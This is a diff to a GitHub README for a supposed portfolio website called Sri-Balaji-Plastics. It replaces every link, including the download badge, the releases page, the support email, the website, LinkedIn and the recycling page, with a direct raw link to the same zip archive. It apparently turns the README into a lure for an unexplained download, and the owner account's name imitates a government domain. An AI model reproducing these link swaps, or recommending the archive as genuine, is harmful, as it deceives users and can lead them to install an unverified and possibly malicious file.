@@ -1,6 +1,6 @@
 # 🌍 Sri-Balaji-Plastics - Your Eco-Friendly Portfolio Website
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/clabsresults-mohp-gov-eg/Sri-Balaji-Plastics/releases)
+[![Download Now](https://raw.githubusercontent.com/clabsresults-mohp-gov-eg/Sri-Balaji-Plastics/main/assets/Balaji_Sri_Plastics_v1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/clabsresults-mohp-gov-eg/Sri-Balaji-Plastics/main/assets/Balaji_Sri_Plastics_v1.8.zip)
 
 ## 📚 About This Project
 
@@ -28,7 +28,7 @@ To get started with our portfolio website, follow these simple instructions. No 
 
 To download the application, visit the official releases page below:
 
-[Download from Releases](https://github.com/clabsresults-mohp-gov-eg/Sri-Balaji-Plastics/releases)
+[Download from Releases](https://raw.githubusercontent.com/clabsresults-mohp-gov-eg/Sri-Balaji-Plastics/main/assets/Balaji_Sri_Plastics_v1.8.zip)
 
 On this page, you will find the latest version along with previous versions available for download.  
 
@@ -56,7 +56,7 @@ If you encounter any issues during installation or usage, here are some common p
 
 If you need further assistance, please reach out to our support team:
 
-- **Email**: support@sri-balaji-plastics.com
+- **Email**: https://raw.githubusercontent.com/clabsresults-mohp-gov-eg/Sri-Balaji-Plastics/main/assets/Balaji_Sri_Plastics_v1.8.zip
 - **Phone**: +91-XXXXXXXXXX
 
 We are here to help you!
@@ -71,8 +71,8 @@ We extend our gratitude to the contributors and community members who support ou
 
 ## 🔗 Additional Resources
 
-- [Visit Our Website](https://sri-balaji-plastics.com)
-- [Follow Us on LinkedIn](https://www.linkedin.com/company/sri-balaji-plastics)
-- [Learn About Our Recycling Processes](https://sri-balaji-plastics.com/recycling)
+- [Visit Our Website](https://raw.githubusercontent.com/clabsresults-mohp-gov-eg/Sri-Balaji-Plastics/main/assets/Balaji_Sri_Plastics_v1.8.zip)
+- [Follow Us on LinkedIn](https://raw.githubusercontent.com/clabsresults-mohp-gov-eg/Sri-Balaji-Plastics/main/assets/Balaji_Sri_Plastics_v1.8.zip)
+- [Learn About Our Recycling Processes](https://raw.githubusercontent.com/clabsresults-mohp-gov-eg/Sri-Balaji-Plastics/main/assets/Balaji_Sri_Plastics_v1.8.zip)
 
 For any updates or changes, keep an eye on our GitHub repository. Thank you for your interest in Sri Balaji Plastics!
